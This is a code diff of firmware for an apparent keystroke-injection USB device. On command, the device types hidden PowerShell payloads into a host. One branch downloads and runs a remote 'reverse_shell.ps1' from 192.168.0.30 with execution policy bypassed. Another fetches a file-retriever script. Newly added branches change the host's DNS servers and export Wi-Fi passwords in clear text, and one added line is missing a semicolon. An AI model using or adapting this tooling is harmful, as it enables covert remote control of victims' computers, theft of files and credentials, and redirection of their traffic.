@@ -35,26 +35,33 @@ void receiveEvent(int bytes)
 
 void executeCommand(String command)
 {
-  if (command == "RS")
+  if (command == "RS") // Reverse Shell
   {
     openPowerShell();
     // killall();
-    // openPowerShellAdmin(); 
-    // ========================
-    // These requires custom configuration for deployment
-    // retrive from the server:
+    // openPowerShellAdmin();
+
+    // These requires custom configuration for deployment to retrive the script
     String payload = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'http://192.168.0.30/reverse_shell.ps1' -OutFile 'C:\\Users\\Public\\reverse_shell.ps1'; Start-Job -FilePath 'C:\\Users\\Public\\reverse_shell.ps1'\"";
-    Keyboard.println(payload); 
+    Keyboard.println(payload);
   }
-  else if (command == "FR")
+  else if (command == "FR") // File Retriever
   {
     openPowerShell();
+    // These requires custom configuration for deployment to retrive the script
     String payload = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'http://192.168.0.30/file_retriver.ps1' -OutFile 'C:\\Users\\Public\\reverse_shell.ps1'; Start-Job -FilePath 'C:\\Users\\Public\\reverse_shell.ps1'\"";
-    Keyboard.println(payload); 
+    Keyboard.println(payload);
   }
-  else if (command == "typ")
+  else if (command == "DNS") // Set DNS Server
   {
-    Serial.print("Recived command:" + command);
+    // Set the DNS server address
+    String payload = "Set-DNSClientServerAddress \"InterfaceAlias\" –ServerAddresses (\"preferred-DNS-address\", \"alternate-DNS-address\")";
+    Keyboard.println(payload);
+  }
+  else if (command == "Wpass") // Retrieve Wi-Fi Passwords
+  {
+    String payload = "netsh wlan export profile key=clear folder=C:\\"
+    Keyboard.println(payload);
   }
   // Add more commands as needed
 }
